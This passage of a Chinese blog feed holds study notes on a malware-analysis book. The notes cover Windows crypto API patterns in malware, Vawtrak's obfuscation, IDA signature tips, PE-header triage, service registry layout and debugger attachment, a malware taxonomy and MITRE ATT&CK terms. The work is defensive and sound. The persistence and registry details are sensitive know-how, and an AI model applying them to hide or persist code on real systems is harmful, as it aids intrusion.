id="1-初始化并连接到加密服务提供者"><a href="#1-初始化并连接到加密服务提供者" class="headerlink" title="1. 初始化并连接到加密服务提供者"></a>1. 初始化并连接到加密服务提供者</h3><p>英文叫cryptographic service provider，即CSP，他是一个库，用来实施在Windows上的加密相关的API，对于恶意软件初始化和使用CSP中的一个的话，它执行<code>CryptAcquireContext</code>​API,</p><p>正如下面这样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CryptAcquireContext</span>(&amp;hProv,<span class="literal">NULL</span>,MS_STRONG_PROV,PROV_RSA_FULL,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>能在<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\Defaults\Provider</code>​看到所有支持的CSP</p><img src="/2023/02/27/Mastering_Malware_Analysis_Chapter_4/image-20230226211330-1dby0rj.png" class="" title="image"><h3 id="2-准备key"><a href="#2-准备key" class="headerlink" title="2. 准备key"></a>2. 准备key</h3><ol><li><p>把自己准备的plain text key进行hash</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CryptCreateHash</span>(hProv,CALG_MD5,<span class="number">0</span>,<span class="number">0</span>,&amp;hHash);</span><br><span class="line"><span class="built_in">CryptHashData</span>(hHash,secretkey,secretkeylen,<span class="number">0</span>);</span><br></pre></td></tr></table></figure></li><li><p>使用CryptDeriveKey创建session key, 从第二个参数很容易识别这个加密算法</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CALG_DES = <span class="number">0x00006601</span> <span class="comment">// DES encryption algorithm.</span></span><br><span class="line">CALG_3DES = <span class="number">0x00006603</span> <span class="comment">// Triple DES encryption algorithm.</span></span><br><span class="line">CALG_AES = <span class="number">0x00006611</span> <span class="comment">// Advanced Encryption Standard (AES).</span></span><br><span class="line">CALG_RC4 = <span class="number">0x00006801</span> <span class="comment">// RC4 stream encryption algorithm.</span></span><br><span class="line">CALG_RSA_KEYX = <span class="number">0x0000a400</span> <span class="comment">// RSA public key exchange algorithm</span></span><br></pre></td></tr></table></figure></li><li><p>一些恶意软件作者使用KEYBLOB结构，然后利用<code>CryptImportKey</code>​导入KEY</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">KEYBLOB</span> &#123;</span>  </span><br><span class="line">BYTE bType; <span class="comment">// 类型  PLAINTEXTKEYBLOB (0x8)  PRIVATEKEYBLOB (0x7)  PUBLICKEYBLOB (0x6)</span></span><br><span class="line">BYTE bVersion;</span><br><span class="line">WORD reserved;</span><br><span class="line">ALG_ID aiKeyAlg;  <span class="comment">//aiKeyAlg就是具体的加密算法类型，是上面的2中的类型，比如0X6601代表CALG_DES</span></span><br><span class="line">DWORD KEYLEN;<span class="comment">//key的长度</span></span><br><span class="line">BYTE[] KEY;<span class="comment">//真正的KEY</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  ******************比如下面************************</span></span><br><span class="line">BYTE DesKeyBlob[] = &#123; <span class="number">0x08</span>,<span class="comment">//代表PLAINTEXTKEYBLOB </span></span><br><span class="line"><span class="number">0x02</span>,<span class="comment">//版本</span></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//保留</span></span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x66</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//CALG_DES</span></span><br><span class="line"><span class="comment">// BLOB header 是上面8个字节</span></span><br><span class="line"><span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">// key length, in bytes</span></span><br><span class="line"><span class="number">0xf1</span>,<span class="number">0x0e</span>,<span class="number">0x25</span>,<span class="number">0x7c</span>,<span class="number">0x6b</span>,<span class="number">0xce</span>,<span class="number">0x0d</span>,<span class="number">0x34</span> <span class="comment">// DES key with parity</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-加密或解密数据"><a href="#3-加密或解密数据" class="headerlink" title="3. 加密或解密数据"></a>3. 加密或解密数据</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CryptEncrypt</span>(hKey,<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>,cyphertext,ctlen,sz);</span><br><span class="line"><span class="built_in">CryptDecrypt</span>(hKey,<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>,plaintext,&amp;ctlen);</span><br></pre></td></tr></table></figure><h3 id="4-释放内存"><a href="#4-释放内存" class="headerlink" title="4. 释放内存"></a>4. 释放内存</h3><p>这是最后一步，利用<code>CryptDestroyKey</code>​ 释放内存和所有的句柄</p><h2 id="Cryptography-API-Next-Generation-CNG"><a href="#Cryptography-API-Next-Generation-CNG" class="headerlink" title="Cryptography API: Next Generation (CNG)"></a>Cryptography API: Next Generation (CNG)</h2><p>这是被微软实施的新一代的APIs，虽然在恶意软件中还没有广泛使用，但它们更容易理解并从中提取信息。</p><p>具体使用↓</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BCryptOpenAlgorithmProvider</span>(&amp;hAesAlg, BCRYPT_AES_ALGORITHM, <span class="literal">NULL</span>, <span class="number">0</span>) <span class="comment">//1. 初始化加密算法提供者</span></span><br><span class="line"><span class="built_in">BCryptGenerateSymmetricKey</span>(hAesAlg, &amp;hKey, pbKeyObject,cbKeyObject, (PBYTE)SecretKey, <span class="built_in"><span class="keyword">sizeof</span></span>(SecretKey), <span class="number">0</span>) <span class="comment">//2. 准备key</span></span><br><span class="line"><span class="built_in">BCryptEncrypt</span>(hKey, pbPlainText, cbPlainText, <span class="literal">NULL</span>, pbIV, cbBlockLen, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;cbCipherText, BCRYPT_BLOCK_PADDING) <span class="comment">//3. 加密数据</span></span><br><span class="line">BCryptCloseAlgorithmProvider， BCryptDestroyKey， HeapFree <span class="comment">//4. 清理工作</span></span><br></pre></td></tr></table></figure><h1 id="加密技术在现在恶意软件中的应用–Vawtrak银行木马"><a href="#加密技术在现在恶意软件中的应用–Vawtrak银行木马" class="headerlink" title="加密技术在现在恶意软件中的应用–Vawtrak银行木马"></a>加密技术在现在恶意软件中的应用–Vawtrak银行木马</h1><p>在这里，我们将研究恶意软件代码中用于混淆和隐藏恶意密钥特征的这些加密算法的其他实现。这些关键特征可用于使用静态签名甚至网络签名来识别恶意软件家族。</p><p>在本节中，我们将了解一种名为Vawtrak的已知银行木马。我们将看到这个恶意软件家族如何加密它的字符串和API名称，并混淆它的网络通信。</p><h2 id="字符串和API名字加密"><a href="#字符串和API名字加密" class="headerlink" title="字符串和API名字加密"></a>字符串和API名字加密</h2><p>。。。这里用了个很简单的加密算法，就不看了。打CTF遇到过类似的，就是把字符串和API全都加密存起来，用的时候再解密，然后通过LoadLibrary加载需要的库，通过GetProcAddress来获取所用的函数的地址。</p><p>‍</p><h2 id="网络流量加密"><a href="#网络流量加密" class="headerlink" title="网络流量加密"></a>网络流量加密</h2><p>没有什么好的方法去识别加密算法，只能是对一些网络发包或者收包的API进行下断点（HttpAddRequestHeadersA），然后追踪，打CTF的时候分析过这种。比如下面这个题，</p><p><a href="https://www.52pojie.cn/thread-1551240-1-1.html">https://www.52pojie.cn/thread-1551240-1-1.html</a></p><h1 id="使用IDA来解密和脱壳"><a href="#使用IDA来解密和脱壳" class="headerlink" title="使用IDA来解密和脱壳"></a>使用IDA来解密和脱壳</h1><h2 id="IDA-tips和tricks"><a href="#IDA-tips和tricks" class="headerlink" title="IDA tips和tricks"></a>IDA tips和tricks</h2><ol><li><p>使用<code>FindCrypt</code>​, <code>IDAscope</code>​, or <code>IDA Signsrch</code>​可以识别加密算法，或者使用<code>capa</code>​这个工具，capa是纯静态的</p></li><li><p>了解到<code>D810</code>​这个插件，可以去混淆</p></li><li><p>恶意软件经常使用一些开源库，比如OpenSSL，这是静态连接到程序里的，去分析这些函数很浪费时间，所以可以生成一些sig文件，这样IDA就会自动的识别出函数名字来。</p><p> 诸如<strong>FLIRTDB</strong>和<strong>sig-database</strong>之类的开源项目为许多操作系统的OpenSSL库提供了FLIRT签名，FLIRT的全程是Fast Library Identification and Recognition Technology</p><ul><li><p>先生成一个.lib文件</p></li><li><p>从官网下载Flair的程序，里面包含一系列的工具，比如生成PAT的，以及sigmake工具等</p></li><li><p>使用pcf生成PAT文件，使用sigmake将PAT变为sig文件，把它放到ida的sig目录下</p></li><li><p>Go to View | Open subviews | Signatures (the Shift + F5 hotkey). 就可以用了</p><p>创建自定义FLIRT签名的另一个流行选项是idb2pat工具。</p></li></ul></li><li><p>默认情况下，IDA在打开文件时运行自动分析，这意味着以后解密的任何代码都不会被分析（比如SMC这种）。可以点击IDA的左下角进行重新分析。</p></li><li><p><code>funcap</code>​这个插件可以记录运行时各个函数的参数，注释的形式添加进去</p></li></ol><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MalwareAnalysis </tag>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Mastering Malware Analysis》第三章</title>
      <link href="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/"/>
      <url>/2023/02/24/Mastering_Malware_Analysis_Chapter_3/</url>
      
        <content type="html"><![CDATA[<p>Mastering Malware Analysis  Chapter 3</p><p>‍</p><h1 id="PE部分"><a href="#PE部分" class="headerlink" title="PE部分"></a>PE部分</h1><p>之前学PE文件结构一直忽视了这个Rich头</p><img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230221183128-tluplti.png" class="" title="image">​<p>通过Rich字符定位这个结构，Rich后紧跟的是一个校验和，他后面紧跟着的是XOR key，可以用它来解密Rich头的内容，一旦解密，就会包含编译这个程序的软件 的 各种各样的信息。</p><h1 id="使用PE头信息用于静态分析"><a href="#使用PE头信息用于静态分析" class="headerlink" title="使用PE头信息用于静态分析"></a>使用PE头信息用于静态分析</h1><p>PE文件得到什么信息取决于需要回答什么问题。</p><h2 id="怎样使用PE头来进行事件处理"><a href="#怎样使用PE头来进行事件处理" class="headerlink" title="怎样使用PE头来进行事件处理"></a>怎样使用PE头来进行事件处理</h2><h3 id="Is-this-malware-packed"><a href="#Is-this-malware-packed" class="headerlink" title="Is this malware packed?"></a>Is this malware packed?</h3><p>看节表的内容（比如UPX0等）或者导入表的数据（通常加了壳的会含有极少的API）</p><p>‍</p><h3 id="Is-this-malware-a-dropper-or-a-downloader"><a href="#Is-this-malware-a-dropper-or-a-downloader" class="headerlink" title="Is this malware a dropper or a downloader?"></a>Is this malware a dropper or a downloader?</h3><p>用Resource Hacker看资源表的数据，观察导入表中的函数，比如URLDownloadToFile或者ShellExecuteA等API</p><p>‍</p><h3 id="Does-it-connect-to-the-Command-amp-Control-server-s-C-amp-C-or-the-attacker’s-website-And-how"><a href="#Does-it-connect-to-the-Command-amp-Control-server-s-C-amp-C-or-the-attacker’s-website-And-how" class="headerlink" title="Does it connect to the Command &amp; Control server(s) (C&amp;C, or the attacker’s website)? And how?"></a>Does it connect to the Command &amp; Control server(s) (C&amp;C, or the attacker’s website)? And how?</h3><p>还是看API，比如send, socket等</p><p>‍</p><h3 id="What-other-functionalities-does-this-malware-have"><a href="#What-other-functionalities-does-this-malware-have" class="headerlink" title="What other functionalities does this malware have?"></a>What other functionalities does this malware have?</h3><p>出现FindFirstFileA可能是勒索病毒</p><p>出现Process32First, Process32Next，CreateRemoteThread可能是进程植入</p><p>出现TerminateProcess可能意味着需要终止应用程序，比如反病毒软件啥的</p><h2 id="怎样使用PE头来进行威胁狩猎？"><a href="#怎样使用PE头来进行威胁狩猎？" class="headerlink" title="怎样使用PE头来进行威胁狩猎？"></a>怎样使用PE头来进行威胁狩猎？</h2><h3 id="When-was-this-sample-created"><a href="#When-was-this-sample-created" class="headerlink" title="When was this sample created?"></a>When was this sample created?</h3><p>TimeDateStamp可以回答这个问题，不过他有可能被伪造，另一个鲜为人知的具有类似用途的字段是Export Directory(可用时)的TimeDateStamp值。</p><h3 id="What’s-the-country-of-origin-of-these-attackers"><a href="#What’s-the-country-of-origin-of-these-attackers" class="headerlink" title="What’s the country of origin of these attackers?"></a>What’s the country of origin of these attackers?</h3><p>可以通过TimeDateStamp来推断，因为大多数的情况下，是特定时区的9点-下午5点工作</p><img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230221201058-g1oduxw.png" class="" title="image"><h3 id="Is-malware-signed-with-a-stolen-certificate-Are-all-these-samples-related"><a href="#Is-malware-signed-with-a-stolen-certificate-Are-all-these-samples-related" class="headerlink" title="Is malware signed with a stolen certificate? Are all these samples related?"></a>Is malware signed with a stolen certificate? Are all these samples related?</h3><p>数据目录表的一项与证书相关。一些应用程序由供应商签名了，但这些证书有时会被不同的恶意软件窃取和使用。</p><p>对于所有使用特定被盗证书的恶意样本s，它们很可能都是由同一参与者生成的。即使它们有不同的目的或针对不同的受害者，它们也可能是同一攻击者执行的不同活动。</p><h1 id="PE加载和进程创建"><a href="#PE加载和进程创建" class="headerlink" title="PE加载和进程创建"></a>PE加载和进程创建</h1><h2 id="进程是什么？"><a href="#进程是什么？" class="headerlink" title="进程是什么？"></a>进程是什么？</h2><p>进程不仅仅是一个运行的应用程序的代表，他还是一个容器，包含所有的关于这个应用程序的信息。（英文书就是牛逼，这里说的通俗易懂）</p><p>这个容器存储着关于和这个进程相关的虚拟内存的信息，所有加载的DLLs， 打开的文件和socket，作为进程一部分的线程列表，进程ID等等等。</p><p>进程是内核中保存所有这些信息的结构，它作为一个实体来表示这个正在运行的可执行文件</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程不仅仅是表示进程内部执行路径的实体(每个进程可以有一个或多个线程同时运行)。它也是内核中保存整个执行状态的结构，包括寄存器、堆栈信息和最后一个错误。</p><p>Windows中的每个线程在停止运行以恢复另一个线程之前都有一个小的时间框架(因为处理器内核的数量远远小于整个系统中运行的线程数量)。</p><p>当Windows将执行从一个线程更改到另一个线程时，它会对整个执行状态(寄存器、堆栈、指令指针等)进行快照，并将其保存在线程结构中，以便能够从停止的位置再次恢复它。</p><p>每一个线程都有1个栈，指令指针，错误处理函数，线程ID和TEB，如下图所示</p><img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230221205544-9nc8642.png" class="" title="image">​<h2 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h2><ol><li><strong>启动程序: ​</strong>当双击某个程序的时候，explorer.exe调用CreateProcess来请求操作系统创建进程和开始执行。</li><li><strong>创建进程数据结构: ​</strong>在内核空间中创建EPROCESS，设置PID和PPID</li><li><strong>初始化虚拟内存: ​</strong>Windows创建进程，准备虚拟内存，在EPROCESS中保存映射，然后创建PEB，加载2个DLL，ntdll.dll和kernel32.dll</li><li><strong>加载PE文件: ​</strong>在那之后，Windows开始加载PE文件，加载所有要求的第三方DLLS，以及这些DLL需要的DLL，确保能发现APIs，然后保存地址在导入表当中。</li><li><strong>开始执行：</strong>Windows创建了第一个线程，他做了许多初始化的工作然后CALL PE文件的Entry Point，TLS callback如果有的话，将会在Entry Point前执行</li></ol><h2 id="WOW64-process"><a href="#WOW64-process" class="headerlink" title="WOW64 process"></a>WOW64 process</h2><p>32位的程序如何运行在64位的操作系统上</p><p>对于这种特殊情况，Windows创建了所谓的WOW64子系统。主要在以下dll中实现:</p><p>•wow64.dll</p><p>•wow64cpu.dll</p><p>•wow64win.dll</p><p>这些dll为32位进程创建模拟环境，其中包括它可能需要的32位版本的库</p><img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230222111526-37xc38f.png" class="" title="image">​<p>另外 IsWow64Process 这个API可以用来判断32位的程序是运行在X86环境下还是X64环境下</p><p>‍</p><h1 id="调试恶意服务"><a href="#调试恶意服务" class="headerlink" title="调试恶意服务"></a>调试恶意服务</h1><h2 id="What-is-a-service"><a href="#What-is-a-service" class="headerlink" title="What is a service?"></a>What is a service?</h2><p>服务是一些在后台执行一定的逻辑的任务，类似于linux的守护进程，所以为了保持持久性，恶意软件作者使用它也不足为奇。</p><p>服务由SCM（Service Control Manager）控制，它是在<code>%SystemRoot%\System32\services.exe</code>​.中，所有的服务都有对应的<code>HKLM\SYSTEM\CurrentControlSet\services&lt;service_name&gt;</code>​键，它包含各种各样的值来描述这个服务，比如下图。</p><img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230222161357-fjrt3tb.png" class="" title="image">​<ul><li><p>ImagePath: 和相应的参数绑定的可执行文件的路径</p></li><li><p>Type: 服务的类型</p><ul><li>0x01(kernel) 在这种情况下，逻辑是在一个驱动程序中实现的(将在第7章“理解内核模式Rootkits”中详细介绍，该章节专门针对内核模式威胁)。</li><li>0x10(own)这个服务运行在他自己的进程中</li><li>0X20（share）服务运行在共享进程中</li></ul></li><li><p>Start: 这世描述服务应该怎样启动的</p><ul><li>0X00（boot）和0X01（system）这些值用于驱动程序，在这种情况下，它们将分别由Boot Loader或者内核初始化期间加载。</li><li>0X02（auto）该服务将在每次机器重新启动时自动启动，这是恶意软件的明显选择。</li><li>0X03（demand) 指定应该手动启动的服务，这个选项对于调试特别有用。</li><li>0x04 (disabled): 服务不启动。</li></ul></li></ul><p>‍</p><p>服务被设计的几种方式</p><ul><li>As an executable: 是一个executable文件，完整路径保存在ImagePath中</li><li>As a DLL(own loader)，是一个DLL，有自己的loader(是一个自定义程序或者标准的，比如rundll32.exe) 完整的命令行保存在ImagePath中</li><li>As a DLL(svchost) svchost.exe加载这个DLL, 为了被加载，恶意软件在<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</code>​中创建新组，把它的值通过-k参数传递给svchost.exe中，ImagePath存的是svchost.exe及其 ，DLL存在<code>HKLM\SYSTEM\CurrentControlSet\services&lt;service_name&gt;\Parameters</code>​中的<code>ServiceDll ​</code>​中, 这个ServiceDll应该包含ServiceMain导出函数，如果使用自定义名称，则应在ServiceMain注册值中指定，如果SvchostPushServiceGlobals导出存在，它将在ServiceMain之前执行。</li></ul><img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230222170615-iacuofu.png" class="" title="image">​<img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230222170509-lp3nqwe.png" class="" title="image">​<img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230222170527-yba3znx.png" class="" title="image">​<p>‍</p><h2 id="Attaching-to-services"><a href="#Attaching-to-services" class="headerlink" title="Attaching to services"></a>Attaching to services</h2><p>有很多方式Attach到服务上一旦他们启动</p><ul><li><p>创建一个专门的注册表键，<code>HKLM\SOFTWARE&lt;br /&gt;Microsoft\Windows NT\CurrentVersion\Image File Execution Options&lt;filename&gt;</code>​ l里面有个值是Debugger，是调试器的路径全程，一旦这个<filename> 启动时，这个Debugger就会附加上去。这里需要注意就是，如果这个服务不是interactive的话，这个Debugger可能不会出现，但是可以用以下的方法解决</p><ul><li>services.msc找到该服务，然后从属性中找到这个框勾上即可。<img src="/2023/02/24/Mastering_Malware_Analysis_Chapter_3/image-20230222181601-zhobw1q.png" class="" title="image"></li><li><code>HKLM\SYSTEM\CurrentControlSet\services&lt;service_name&gt;</code>​中值 OR 0X100</li><li>sc的时候加上type= interact参数即可</li></ul></li><li><p>使用GFlags(Global Flags Editor)</p></li><li><p>子进程调试</p></li><li><p>Patch入口点，使其无限循环，然后再Attach</p></li></ul><p>需要注意的是，服务在一定时间内如果没有执行成功，可能会被KILL，有个时间限制在<code>HKLM\SYSTEM\CurrentControlSet\\Control</code>​中</p><p>‍</p><h1 id="行为分析要点"><a href="#行为分析要点" class="headerlink" title="行为分析要点"></a>行为分析要点</h1><p>这种方法允许研究人员快速了解恶意软件的功能。然而，与之相关的局限性有很多，如下。</p><ul><li>恶意软件可能仅仅执行了它功能的一部分。</li><li>恶意软件可能表现出不同的行为当他检测出自己正在被分析的时候。</li></ul><p>在大多数情况下，行为分析工具可以很容易地通过各种特征检测到:文件、进程或目录名称、注册表键和值、互斥对象、窗口名称，等等。</p><p>现在，让我们看看最常用的工具，按类型对它们进行分组。</p><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>Process Monitor (Filemon)</p><p>Sandboxie：这个工具的主要目的不仅仅是记录文件操作，而是让研究人员访问创建/修改的文件。如果恶意软件掉落或下载额外的模块并随后删除它们，这是非常有用的。(这个地方暂时没有明白是什么意思，我原以为只要在Sandbox中创建的文件，即使删除了也有办法恢复，但是我自己测试没有恢复。)</p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>Process Monitor (Regmon)</p><p>Regshot</p><p>Autoruns</p><h2 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h2><p>Process Monitor(Procmon)</p><p>Process Explorer</p><h1 id="WinAPIs"><a href="#WinAPIs" class="headerlink" title="WinAPIs"></a>WinAPIs</h1><p>API Monitor</p><h2 id="Network-activity"><a href="#Network-activity" class="headerlink" title="Network activity"></a>Network activity</h2><p>Tcpview</p><p>Wireshark</p><h2 id="Sandboxes"><a href="#Sandboxes" class="headerlink" title="Sandboxes"></a>Sandboxes</h2><p>沙箱也有很多限制</p><ol><li>沙箱不知道恶意软件执行的环境，比如需要什么命令行啥的</li><li>很容易的被检测到，恶意软件可能立刻终止或者表现出假的活动</li><li>它们的可见性是有限的，因为它们通常只显示恶意软件的一部分功能</li></ol><p>‍</p><p>在线沙箱服务</p><ul><li><a href="https://any.run/">https://any.run</a></li><li><a href="https://www.hybrid-analysis.com/">https://www.hybrid-analysis.com</a></li><li><a href="https://virustotal.com/">https://virustotal.com</a> (the Behavior tab)</li></ul><p>自管理沙箱</p><ul><li>Cuckoo(Free)</li><li>DRAKVUF Sandbox(Free)</li><li>VMRay(Commercial)</li></ul><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MalwareAnalysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Mastering Malware Analysis》第一章</title>
      <link href="/2023/02/20/Mastering_Malware_Analysis_Chapter_1/"/>
      <url>/2023/02/20/Mastering_Malware_Analysis_Chapter_1/</url>
      
        <content type="html"><![CDATA[<p>Mastering Malware Analysis  Chapter 1</p><p>只记录想记录的，一些熟练的就不记录了~ ~ ~<br>CTI：Cyber Threat Intelligence</p><p>IoCs: Indicator of Compromise</p><p>IoAs: Indicators of Attack</p><p>NDRs: Network Detection Responses</p><h1 id="为什么分析恶意软件"><a href="#为什么分析恶意软件" class="headerlink" title="为什么分析恶意软件"></a>为什么分析恶意软件</h1><h2 id="恶意软件分析在事件响应中"><a href="#恶意软件分析在事件响应中" class="headerlink" title="恶意软件分析在事件响应中"></a>恶意软件分析在事件响应中</h2><p>攻击发生—&gt;取证—&gt;发现malware–&gt;分析</p><ol><li>发现所有的IoCs</li><li>理解Payload的能力</li><li>解密和理解在malware和attacker之间的网络流量</li></ol><p>为了达到大的覆盖范围，基于Windows的恶意软件仍然是最盛行的（因为它常用），再就是Android, IoT</p><p>‍</p><h1 id="探索恶意软件类型"><a href="#探索恶意软件类型" class="headerlink" title="探索恶意软件类型"></a>探索恶意软件类型</h1><h2 id="恶意软件种类"><a href="#恶意软件种类" class="headerlink" title="恶意软件种类"></a>恶意软件种类</h2><p>恶意软件的种类通常由他的影响或传播方法定义。下面是常用的例子</p><ol><li><p><strong>Trojan</strong>: 最常见的恶意软件种类，在用户不知情的环境中执行恶意活动，得名于传说中征服特洛伊城的特洛伊木马。</p><ol><li><strong>Downloader</strong>:下载执行外部的payload</li><li><strong>Dropper</strong>: 在这里额外的payload不是下载的，而是从Trojan的主体中释放出来的</li><li><strong>Backdoor</strong>, 被称为<strong>Remote Access Trojan(RAT)</strong>: 在这里，恶意软件可以接受远程命令来表现一些行为</li><li><strong>Ransomware</strong>, 勒索病毒</li><li><strong>Infostealer, aka Password Stealer(PWS): ​</strong>窃取信息</li><li><strong>Spyware</strong>:范围相比Infostealer更广泛，可能包含视频，音频录制或者GPS跟踪等</li><li><strong>Banker</strong>: 应该是属于Infostealer的范畴，但是他目的更窄，然后潜在的功能范围大，在这里，恶意软件可能非常专注于获取资金，因此它也可以支持拦截银行发送的一次性令牌，作为双因素身two-factor authentication(2FA)的一部分。修改财务信息以重定向支付，或注入脚本以拦截输入的银行凭证。</li><li><strong>Dos</strong>: <strong>Denial of Service (DoS)，</strong>目的是使目标系统或服务不能用</li><li><strong>Wiper</strong>: 在这里，恶意软件被用来删除对系统操作敏感或关键的信息，使其成为DoS攻击的另一个工具。</li><li><strong>DDos: Distributed Denial of Service (DDoS)</strong> 大量的bots通过网络攻击受害者</li><li><strong>Spammer, aka spambo</strong>: 代表受害者发送垃圾邮件</li><li><strong>Clicker</strong>：在这里，攻击者可以模拟真实的用户点击，从广告，搜索引擎中毒，或推广虚假账户中获得资金。</li><li><strong>Miner</strong>:挖矿</li><li><strong>Packed:</strong> 与实际的威胁无关，这个名称的意思就是这个样本被恶意保护起来了</li><li><strong>Injector</strong>: 用到了注入</li></ol></li><li><p><strong>Worm: ​</strong>可以在不同机器间自我传播</p></li><li><p>**Virus:**与机器间传播的蠕虫不同，文件感染程序的主要目标是通过感染其他可执行文件和文档在当前系统内传播。在这种情况下，当受害者打开/启动合法文件时，控制权也会交给恶意代码。它的使用方式有多种，从实际将恶意代码和数据写入可执行文件，到向文档添加宏模板，再到简单地用受害者文件的主体替换受害者文件，并将原始文件的副本存储在其他地方以供以后执行。</p></li><li><p><strong>Rootkit</strong>: 之前用来定义提升权限的工具，现在常用定义威胁，这些威胁要么用来隐藏其它威胁，要么只是在内核模式下操作。</p></li><li><p><strong>Bootkie</strong>: 这些威胁会将自己插入到引导过程中，从而在操作系统之前获得访问权限。</p></li><li><p><strong>Exploit</strong>: 利用漏洞</p></li><li><p><strong>FakeAV</strong>: 这类威胁向用户显示各种关于其系统据称存在的关键问题的警告，并强烈要求用户购买“完整版本”来修复它。</p></li><li><p><strong>Hoax</strong>: 吓唬用户不存在的问题</p></li><li><p><strong>PUAs</strong>: 指潜在的不想要的应用程序，比如在后台悄悄的安装并不需要的软件</p></li><li><p><strong>Adware</strong>: 广告</p></li><li><p><strong>Hacktool: ​</strong>很大类别，涉及攻击者和网络安全人员都可以使用的很多工具，例如用于红队目的的</p></li><li><p><strong>Dual-use tools:</strong> 攻击者和合法用户都可以使用的工具，比如Sysinternals的psexec工具</p></li></ol><h2 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h2><p>没有统一的标准，通常检测名字包含目标平台，恶意软件种类和家族，有时候也包含版本和检测技术</p><p>下面是基于VirusTotal对恶意样本 <code>9e0a15a4318e3e788bad61398b8a40d4916d63ab27b47f3bdbe329c462193600</code>​的不同命名</p><ul><li> Avast: ELF:CVE-2017-17215-A [Expl]</li><li> DrWeb: Linux.Packed.1037</li><li> Kaspersky Lab: HEUR:Backdoor.Linux.Mirai.b</li><li>Microsoft: Trojan:Win32/Ceevee</li><li>Sophos: Linux/DDoS-CI</li><li>Symantec: Trojan.Gen.NPE</li></ul><h1 id="MITRE-ATT-amp-CK框架解释"><a href="#MITRE-ATT-amp-CK框架解释" class="headerlink" title="MITRE ATT&amp;CK框架解释"></a>MITRE ATT&amp;CK框架解释</h1><p>全称为 Adversarial Tactics, Techniques, and Common Knowledge</p><p>正如我们之前提到的，不同的网络安全供应商通常给黑客组织和恶意软件家族起不同的名字。因此，知识交流变得更加复杂，最终影响了社区的绩效。MITRE ATT&amp;CK框架的创建就是为了解决这个问题和其他类似的问题，并让安全专家使用相同的语言。这是一个与供应商无关的全球知识库，它将各种攻击技术分组为战术，还提供了攻击者和恶意软件使用它们的示例，并为这些战术提供了广泛接受的名称。</p><p>‍</p><h2 id="基本的术语"><a href="#基本的术语" class="headerlink" title="基本的术语"></a>基本的术语</h2><p><strong>Tactic</strong>: 表示攻击者的高级目标，执行相应动作的原因</p><p><strong>Technique</strong>: 实现高级目标的具体实现方法</p><p><strong>Sub-technique</strong>: 一个关于某个操作具体执行更细节的描述</p><p><strong>Procedure</strong>: technique和sub-technique的具体实现</p><p><strong>TTPs</strong>：代表Tactic、Technique和Procedure对攻击者使用的方法进行总结，并解释利用这些方法可以达到什么目的</p><p><strong>Group</strong>: 代表一组相关的对抗活动，可能由在这个名字下面的已知的一个单独的实体执行^（不明白啥意思。。。 ）^</p><p><strong>Mitigation</strong>: 